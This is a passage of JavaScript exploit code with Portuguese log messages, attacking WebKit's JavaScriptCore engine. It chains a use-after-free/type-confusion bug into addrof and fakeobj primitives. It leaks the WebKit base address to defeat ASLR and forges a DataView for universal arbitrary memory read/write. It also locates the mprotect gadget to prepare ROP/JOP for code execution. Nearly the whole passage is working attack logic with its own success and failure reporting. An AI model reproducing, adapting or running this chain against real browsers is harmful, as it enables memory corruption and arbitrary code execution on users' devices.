                    logFn(`SUCESSO: Endereço base REAL da WebKit OBTIDO VIA UAF/TC: ${webkit_base_address.toString(true)}`, "good");

                    const mprotect_plt_offset_check = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
                    const mprotect_addr_check = webkit_base_address.add(mprotect_plt_offset_check);
                    logFn(`[UAF LEAK] Verificando gadget mprotect_plt_stub em ${mprotect_addr_check.toString(true)} (para validar ASLR).`, "info");
                    const mprotect_first_bytes_check = await arb_read(mprotect_addr_check, 4);

                    if (mprotect_first_bytes_check !== 0 && mprotect_first_bytes_check !== 0xFFFFFFFF) {
                        logFn(`[UAF LEAK] LEITURA DE GADGET CONFIRMADA: Primeiros bytes de mprotect: ${toHex(mprotect_first_bytes_check)}. ASLR validado!`, "good");
                    } else {
                        logFn(`[UAF LEAK] ALERTA: Leitura de gadget mprotect retornou zero ou FFFFFFFF. ASLR pode estar incorreto ou arb_read local falhando para endereços de código.`, "warn");
                    }

                } catch (e_uaf_leak) {
                    logFn(`[UAF LEAK] ERRO CRÍTICO no vazamento de ASLR via UAF/TC: ${e_uaf_leak.message}\n${e_uaf_leak.stack || ''}`, "critical");
                    throw new Error("Vazamento de ASLR via UAF/TC falhou, abortando exploração.");
                }
                await PAUSE(LOCAL_MEDIUM_PAUSE);

                logFn("--- FASE 3: Configurando a NOVA primitiva de L/E Arbitrária Universal (via fakeobj DataView) com Tentativa e Erro de m_mode ---", "subtest");

                const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FOR_FAKE = parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16);
                const DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE = webkit_base_address.add(new AdvancedInt64(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FOR_FAKE, 0));
                logFn(`[${FNAME_CURRENT_TEST_BASE}] Endereço calculado do vtable da DataView Structure para FORJAMENTO: ${DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE.toString(true)}`, "info");

                const mModeCandidates = JSC_OFFSETS_PARAM.DataView.M_MODE_CANDIDATES;
                let universalRwSuccess = false;

                for (const candidate_m_mode of mModeCandidates) {
                    logFn(`[${FNAME_CURRENT_TEST_BASE}] Tentando m_mode candidato: ${toHex(candidate_m_mode)}`, "info");
                    universalRwSuccess = await attemptUniversalArbitraryReadWriteWithMMode(
                        logFn,
                        PAUSE,
                        JSC_OFFSETS_PARAM,
                        DATA_VIEW_STRUCTURE_VTABLE_ADDRESS_FOR_FAKE,
                        candidate_m_mode
                    );
                    if (universalRwSuccess) {
                        found_m_mode = candidate_m_mode;
                        logFn(`[${FNAME_CURRENT_TEST_BASE}] SUCESSO: Primitive Universal ARB R/W configurada com m_mode: ${toHex(found_m_mode)}.`, "good");
                        break;
                    } else {
                        logFn(`[${FNAME_CURRENT_TEST_BASE}] FALHA: m_mode ${toHex(candidate_m_mode)} não funcionou. Tentando o próximo...`, "warn");
                        await PAUSE(LOCAL_SHORT_PAUSE);
                    }
                }

                if (!universalRwSuccess) {
                    const errorMsg = "Falha crítica: NENHUM dos m_mode candidatos conseguiu configurar a primitiva Universal ARB R/W via fakeobj DataView. Abortando exploração.";
                    logFn(errorMsg, "critical");
                    throw new Error(errorMsg);
                }
                logFn("Primitiva de L/E Arbitrária Universal (arb_read_universal_js_heap / arb_write_universal_js_heap) CONFIGURADA com sucesso.", "good");
                await PAUSE(LOCAL_MEDIUM_PAUSE);

                const dumpTargetUint8Array = new Uint8Array(0x100);
                hold_objects.push(dumpTargetUint8Array);
                const dumpTargetAddr = addrof_core(dumpTargetUint8Array);
                logFn(`[DEBUG] Dump de memória de um novo Uint8Array real (${dumpTargetAddr.toString(true)}) usando L/E Universal.`, "debug");
                await dumpMemory(dumpTargetAddr, 0x100, logFn, arb_read_universal_js_heap, "Uint8Array Real Dump (Post-Universal-RW)");
                await PAUSE(LOCAL_MEDIUM_PAUSE);

                logFn("Iniciando descoberta FUNCIONAL de gadgets ROP/JOP na WebKit...", "info");
                const mprotect_plt_offset = new AdvancedInt64(parseInt(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["mprotect_plt_stub"], 16), 0);
                const mprotect_addr_real = webkit_base_address.add(mprotect_plt_offset);

                logFn(`[REAL LEAK] Endereço do gadget 'mprotect_plt_stub' calculado: ${mprotect_addr_real.toString(true)}`, "leak");
                const mprotect_first_bytes = await arb_read_universal_js_heap(mprotect_addr_real, 4);
                logFn(`[REAL LEAK] Primeiros 4 bytes de mprotect_plt_stub (${mprotect_addr_real.toString(true)}): ${toHex(mprotect_first_bytes)}`, "leak");
                if (mprotect_first_bytes !== 0 && mprotect_first_bytes !== 0xFFFFFFFF) {
                    logFn(`[REAL LEAK] Leitura do gadget mprotect_plt_stub via L/E Universal bem-sucedida.`, "good");
                } else {
                    logFn(`[REAL LEAK] FALHA: Leitura do gadget mprotect_plt_stub via L/E Universal retornou zero ou FFFFFFFF.`, "error");
                }

                logFn(`PREPARED: Tools for ROP/JOP (real addresses) are ready. Time: ${(performance.now() - startTime).toFixed(2)}ms`, "good");
                await PAUSE(LOCAL_MEDIUM_PAUSE);

                logFn("--- FASE 5: Verificação Funcional de L/E e Teste de Resistência ao GC (Pós-ASLR Leak) ---", "subtest");
                const rwTestPostLeakStartTime = performance.now();

                const test_obj_post_leak = global_spray_objects[50000];
                hold_objects.push(test_obj_post_leak);
                logFn(`Objeto de teste escolhido do spray (índice 50000) para teste pós-vazamento.`, "info");

                const test_obj_addr_post_leak = addrof_core(test_obj_post_leak);
                logFn(`Endereço do objeto de teste pós-vazamento: ${test_obj_addr_post_leak.toString(true)}`, "info");

                const faked_obj_for_post_leak_test = fakeobj_core(test_obj_addr_post_leak);
                if (!faked_obj_for_post_leak_test || typeof faked_obj_for_post_leak_test !== 'object') {
                    throw new Error("Failed to recreate fakeobj for post-ASLR leak test.");
                }

                const original_val_prop = test_obj_post_leak.val1;
                logFn(`Valor original de 'val1' no objeto de spray: ${toHex(original_val_prop)}`, 'debug');

                faked_obj_for_post_leak_test.val1 = 0x1337BEEF;
                await PAUSE(LOCAL_VERY_SHORT_PAUSE);
                const read_back_val_prop = faked_obj_for_post_leak_test.val1;

                if (test_obj_post_leak.val1 === 0x1337BEEF && read_back_val_prop === 0x1337BEEF) {
                    logFn(`SUCESSO: Escrita/Leitura de propriedade via fakeobj (após vazamento ASLR) validada. Objeto original 'val1' agora é 0x1337BEEF.`, "good");
                } else {
                    logFn(`FALHA: Escrita/Leitura de propriedade via fakeobj (após vazamento ASLR) inconsistente. Original 'val1': ${toHex(test_obj_post_leak.val1)}, Read via fakeobj: ${toHex(read_back_val_prop)}.`, "error");
                    throw new Error("R/W verification post-ASLR leak failed.");
                }

                logFn("SUCESSO: Verificação de L/E pós-vazamento validada.", "good");

                logFn("Iniciando teste de resistência PÓS-VAZAMENTO: Executando L/E arbitrária múltiplas vezes...", "info");
                let resistanceSuccessCount_post_leak = 0;
                const numResistanceTests = 10;
                const butterfly_addr_of_spray_obj = test_obj_addr_post_leak.add(JSC_OFFSETS_PARAM.JSObject.BUTTERFLY_OFFSET);

                for (let i = 0; i < numResistanceTests; i++) {
                    const test_value_arb_rw = new AdvancedInt64(0xCCCC0000 + i, 0xDDDD0000 + i);
                    try {
                        await arb_write_universal_js_heap(butterfly_addr_of_spray_obj, test_value_arb_rw, 8);
                        const read_back_value_arb_rw = await arb_read_universal_js_heap(butterfly_addr_of_spray_obj, 8);

                        if (read_back_value_arb_rw.equals(test_value_arb_rw)) {
                            resistanceSuccessCount_post_leak++;
                            logFn(`[Resistência PÓS-VAZAMENTO #${i}] SUCESSO: L/E arbitrária consistente no Butterfly.`, "debug");
                        } else {
                            logFn(`[Resistência PÓS-VAZAMENTO #${i}] FALHA: L/E arbitrária inconsistente no Butterfly. Written: ${test_value_arb_rw.toString(true)}, Read: ${read_back_value_arb_rw.toString(true)}.`, "error");
                        }
                    } catch (resErr) {
                        logFn(`[Resistência PÓS-VAZAMENTO #${i}] ERRO: Exceção durante L/E arbitrária no Butterfly: ${resErr.message}`, "error");
                    }
                    await PAUSE(LOCAL_VERY_SHORT_PAUSE);
                }
                if (resistanceSuccessCount_post_leak === numResistanceTests) {
                    logFn(`SUCESSO TOTAL: Teste de resistência PÓS-VAZAMENTO concluído. ${resistanceSuccessCount_post_leak}/${numResistanceTests} operações bem-sucedidas.`, "good");
                } else {
                    logFn(`ALERTA: Teste de resistência PÓS-VAZAMENTO concluído com ${numResistanceTests - resistanceSuccessCount_post_leak} falhas.`, "warn");
                }
                logFn(`Verificação funcional de L/E e Teste de Resistência PÓS-VAZAMENTO concluídos. Time: ${(performance.now() - rwTestPostLeakStartTime).toFixed(2)}ms`, "info");

                logFn("++++++++++++ SUCESSO TOTAL! Todas as fases do exploit foram concluídas com sucesso. ++++", "vuln");
                attemptResult.success = true;
                attemptResult.message = "Cadeia de exploração concluída. Leitura/Escrita arbitrária 100% funcional e verificada. Vazamento REAL de Base WebKit e preparação para ACE bem-sucedidos.";
                attemptResult.details = {
                    webkitBaseAddress: webkit_base_address ? webkit_base_address.toString(true) : "N/A",
                    mprotectGadget: mprotect_addr_real ? mprotect_addr_real.toString(true) : "N/A",
                    foundMMode: found_m_mode ? toHex(found_m_mode) : "N/A",
                    jsObjectPtrTagHigh: toHex(JSVALUE_OBJECT_PTR_TAG_HIGH)
                };

            } catch (e) {
                attemptResult.message = `Exceção crítica na implementação funcional: ${e.message}\n${e.stack || ''}`;
                attemptResult.success = false;
                logFn(attemptResult.message, "critical");
            } finally {
                logFn(`Iniciando limpeza final do ambiente e do spray de objetos para a próxima tentativa...`, "info");
                global_spray_objects = [];
                hold_objects = [];
                clearOOBEnvironment({ force_clear_even_if_not_setup: true });
                logFn(`Limpeza final concluída para a tentativa. Tempo total: ${(performance.now() - startTime).toFixed(2)}ms`, "info");
            }
            final_results.push(attemptResult);
            logFn(`--- TENTATIVA CONCLUÍDA: Tamanho Vítima=${victim_size} bytes, Spray Count=${spray_count}. Resultado: ${attemptResult.success ? 'SUCESSO' : 'FALHA'} ---`, "test");
        }
    }

    logFn(`\n--- ${FNAME_CURRENT_TEST_BASE} Concluído. Sumário de todas as tentativas: ---`, "test");
    let overallSuccessCount = 0;
    final_results.forEach((res, index) => {
        logFn(`[SUMÁRIO ${index + 1}] Vítima=${res.victim_size}, Spray=${res.spray_count}: ${res.success ? 'SUCESSO' : 'FALHA'} - ${res.message}`, res.success ? 'good' : 'error');
        if (res.details) {
            logFn(`  Detalhes: ${JSON.stringify(res.details)}`, "info");
        }
        if (res.success) overallSuccessCount++;
    });

    const overallResultSuccess = overallSuccessCount > 0;
    const finalMessageOverall = overallResultSuccess
        ? `SUCESSO GERAL: Pelo menos uma combinação de parâmetros resultou em exploração bem-sucedida. Total de SUCESSOS: ${overallSuccessCount} de ${final_results.length} tentativas.`
        : `FALHA GERAL: Nenhuma combinação de parâmetros resultou em exploração bem-sucedida.`;

    logFn(`\n${finalMessageOverall}`, overallResultSuccess ? 'vuln' : 'critical');

    return {
        errorOccurred: overallResultSuccess ? null : finalMessageOverall,
        addrof_result: { success: overallResultSuccess, msg: "Primitiva addrof funcional (se houver sucesso geral)." },
        webkit_leak_result: { success: overallResultSuccess, msg: finalMessageOverall, all_attempts_details: final_results },
        heisenbug_on_M2_in_best_result: 'N/A (UAF Strategy)',
        oob_value_of_best_result: 'N/A (UAF Strategy)',
        tc_probe_details: { strategy: 'UAF/TC -> ARB R/W' }
    };
}
